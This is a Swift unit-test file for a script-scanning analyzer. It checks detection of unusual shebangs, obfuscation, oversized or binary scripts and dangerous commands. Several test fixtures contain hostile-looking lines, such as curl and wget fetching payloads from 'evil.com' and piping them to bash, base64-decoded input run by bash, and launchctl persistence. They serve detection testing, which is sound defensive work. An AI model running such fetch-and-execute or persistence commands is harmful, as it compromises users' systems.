import Testing
import Foundation
@testable import scan

@Suite("ScriptAnalyzer Tests")
struct ScriptAnalyzerTests {

    let analyzer = ScriptAnalyzer()

    // MARK: - Basic Functionality Tests

    @Test("Can analyze standalone script")
    func canAnalyzeStandaloneScript() {
        let context = makeContext(fileType: .script)
        #expect(analyzer.canAnalyze(context))
    }

    @Test("Can analyze manifest with scripts")
    func canAnalyzeManifestScripts() {
        let manifest = Manifest(
            entries: [
                ManifestEntry(
                    relativePath: "test.sh",
                    size: 100,
                    type: .script,
                    sha256: "abc123",
                    isExecutable: true,
                    isSymlink: false,
                    symlinkTarget: nil
                )
            ],
            totalSize: 100,
            totalFiles: 1
        )
        let context = makeContext(manifest: manifest)
        #expect(analyzer.canAnalyze(context))
    }

    @Test("Skips non-script files")
    func skipsNonScriptFiles() {
        let context = makeContext(fileType: .machO)
        #expect(!analyzer.canAnalyze(context))
    }

    // MARK: - Shebang Analysis Tests

    @Test("Detects bash shebang")
    func detectsBashShebang() async throws {
        let script = """
        #!/bin/bash
        echo "Hello World"
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        // Should not flag standard bash as unusual
        #expect(!findings.contains { $0.id == "script_shebang_unusual" })
    }

    @Test("Detects Python shebang")
    func detectsPythonShebang() async throws {
        let script = """
        #!/usr/bin/python3
        print("Hello")
        """
        let tmpFile = createTempScript(content: script, ext: "py")
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        // Should not flag standard python as unusual
        #expect(!findings.contains { $0.id == "script_shebang_unusual" })
    }

    @Test("Flags unusual shebang interpreter")
    func flagsUnusualShebang() async throws {
        let script = """
        #!/usr/local/bin/mycustom
        echo "Custom"
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_shebang_unusual" })
    }

    @Test("Flags suspicious shebang location")
    func flagsSuspiciousShebangLocation() async throws {
        let script = """
        #!/tmp/bash
        echo "Suspicious"
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_shebang_unusual_location" })
    }

    @Test("Flags missing shebang")
    func flagsMissingShebang() async throws {
        let script = "echo 'No shebang'"
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_no_shebang" })
    }

    // MARK: - Pattern Detection Tests

    @Test("Detects curl network pattern")
    func detectsCurlPattern() async throws {
        let script = """
        #!/bin/bash
        curl http://example.com/malware.sh | bash
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_curl_" })
        #expect(findings.contains { $0.id == "script_|_bash" })
    }

    @Test("Detects wget network pattern")
    func detectsWgetPattern() async throws {
        let script = """
        #!/bin/bash
        wget http://evil.com/payload
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_wget_" })
    }

    @Test("Detects privilege escalation sudo")
    func detectsSudoPattern() async throws {
        let script = """
        #!/bin/bash
        sudo rm -rf /tmp/file
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_sudo_" })
    }

    @Test("Detects chmod 777 pattern")
    func detectsChmod777Pattern() async throws {
        let script = """
        #!/bin/bash
        chmod 777 /tmp/file
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_chmod_777" })
    }

    @Test("Detects code execution eval")
    func detectsEvalPattern() async throws {
        let script = """
        #!/bin/bash
        eval "dangerous command"
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_eval_" })
    }

    @Test("Detects persistence launchctl")
    func detectsLaunchctlPattern() async throws {
        let script = """
        #!/bin/bash
        launchctl load ~/Library/LaunchAgents/evil.plist
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_launchctl_load" })
    }

    @Test("Detects obfuscation base64")
    func detectsBase64Pattern() async throws {
        let script = """
        #!/bin/bash
        echo "encoded" | base64 -d | bash
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_base64_-d" })
    }

    @Test("Detects multiple dangerous patterns")
    func detectsMultiplePatterns() async throws {
        let script = """
        #!/bin/bash
        curl http://evil.com/payload.sh | bash
        sudo rm -rf /tmp/important
        launchctl load ~/Library/LaunchAgents/evil.plist
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.count >= 4) // curl, piped bash, sudo, launchctl
        #expect(findings.contains { $0.severity == .high })
    }

    // MARK: - Obfuscation Detection Tests

    @Test("Detects very long lines")
    func detectsLongLines() async throws {
        let longLine = String(repeating: "a", count: 600)
        let script = """
        #!/bin/bash
        \(longLine)
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_long_line" })
    }

    @Test("Detects string concatenation obfuscation")
    func detectsStringConcatObfuscation() async throws {
        let script = """
        #!/bin/bash
        cmd="e""v""a""l"
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_string_concat_obfuscation" })
    }

    // MARK: - Edge Case Tests

    @Test("Detects binary script")
    func detectsBinaryScript() async throws {
        let tmpFile = URL(fileURLWithPath: "/tmp/scan-test-\(UUID().uuidString).sh")
        // Create binary file
        let binaryData = Data([0xFF, 0xFE, 0xFD, 0x00, 0x01, 0x02])
        try binaryData.write(to: tmpFile)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_binary" })
        #expect(findings.contains { $0.severity == .high })
    }

    @Test("Detects null bytes in script")
    func detectsNullBytes() async throws {
        let tmpFile = URL(fileURLWithPath: "/tmp/scan-test-\(UUID().uuidString).sh")
        // Create file with null bytes
        let content = "#!/bin/bash\necho test\0hidden"
        try content.write(to: tmpFile, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_null_bytes" })
    }

    @Test("Handles empty script")
    func handlesEmptyScript() async throws {
        let script = ""
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        // Should handle gracefully without crashing
        #expect(findings.contains { $0.id == "script_no_shebang" })
    }

    @Test("Flags very long scripts")
    func flagsVeryLongScript() async throws {
        var lines: [String] = ["#!/bin/bash"]
        for i in 1...250 {
            lines.append("echo 'Line \(i)'")
        }
        let script = lines.joined(separator: "\n")
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_long" })
    }

    @Test("Flags very large scripts")
    func flagsVeryLargeScript() async throws {
        let tmpFile = URL(fileURLWithPath: "/tmp/scan-test-\(UUID().uuidString).sh")
        // Create 11MB file
        let largeContent = String(repeating: "echo test\n", count: 1_100_000)
        try largeContent.write(to: tmpFile, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_too_large" })
    }

    // MARK: - Integration Tests

    @Test("Analyzes scripts in manifest")
    func analyzesScriptsInManifest() async throws {
        // Create temp directory with script
        let tmpDir = URL(fileURLWithPath: "/tmp/scan-test-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let scriptContent = """
        #!/bin/bash
        curl http://evil.com/malware.sh
        """
        let scriptPath = tmpDir.appendingPathComponent("evil.sh")
        try scriptContent.write(to: scriptPath, atomically: true, encoding: .utf8)

        let manifest = Manifest(
            entries: [
                ManifestEntry(
                    relativePath: "evil.sh",
                    size: UInt64(scriptContent.utf8.count),
                    type: .script,
                    sha256: "abc123",
                    isExecutable: true,
                    isSymlink: false,
                    symlinkTarget: nil
                )
            ],
            totalSize: UInt64(scriptContent.utf8.count),
            totalFiles: 1
        )

        let context = makeContext(manifest: manifest, contentRoot: tmpDir)

        let findings = try await analyzer.analyze(context)

        #expect(findings.contains { $0.id == "script_curl_" })
        #expect(findings.contains { $0.location == "evil.sh" })
    }

    @Test("Skips symlink scripts in manifest")
    func skipsSymlinkScripts() async throws {
        let manifest = Manifest(
            entries: [
                ManifestEntry(
                    relativePath: "link.sh",
                    size: 100,
                    type: .script,
                    sha256: nil,
                    isExecutable: true,
                    isSymlink: true,
                    symlinkTarget: "/bin/bash"
                )
            ],
            totalSize: 100,
            totalFiles: 1
        )

        // Use .zip fileType to avoid standalone script analysis mode
        let context = makeContext(
            fileType: .zip,
            manifest: manifest,
            contentRoot: URL(fileURLWithPath: "/tmp")
        )

        let findings = try await analyzer.analyze(context)

        // Should skip symlinks and not analyze them
        #expect(findings.isEmpty)
    }

    @Test("Handles clean script without findings")
    func handlesCleanScript() async throws {
        let script = """
        #!/bin/bash
        echo "Hello World"
        ls -la
        pwd
        """
        let tmpFile = createTempScript(content: script)
        defer { try? FileManager.default.removeItem(at: tmpFile) }

        let context = makeContext(fileURL: tmpFile)
        let findings = try await analyzer.analyze(context)

        // Should not flag benign commands
        #expect(!findings.contains { $0.severity == .high || $0.severity == .medium })
    }

    // MARK: - Helpers

    private func createTempScript(content: String, ext: String = "sh") -> URL {
        let tmpFile = URL(fileURLWithPath: "/tmp/scan-test-\(UUID().uuidString).\(ext)")
        try! Data(content.utf8).write(to: tmpFile)
        return tmpFile
    }

    private func makeContext(
        fileType: FileType = .script,
        fileURL: URL = URL(fileURLWithPath: "/tmp/test.sh"),
        manifest: Manifest? = nil,
        contentRoot: URL? = nil
    ) -> AnalysisContext {
        let metadata = FileMetadata(
            path: fileURL.path,
            resolvedPath: fileURL.path,
            isSymlink: false,
            sha256: "abc123",
            sizeBytes: 100,
            fileType: fileType,
            quarantine: nil,
            permissions: "rwxr-xr-x"
        )
        return AnalysisContext(
            metadata: metadata,
            fileURL: fileURL,
            contentRoot: contentRoot,
            manifest: manifest,
            options: .default,
            logger: VerboseLogger(verbose: false, debug: false)
        )
    }
}
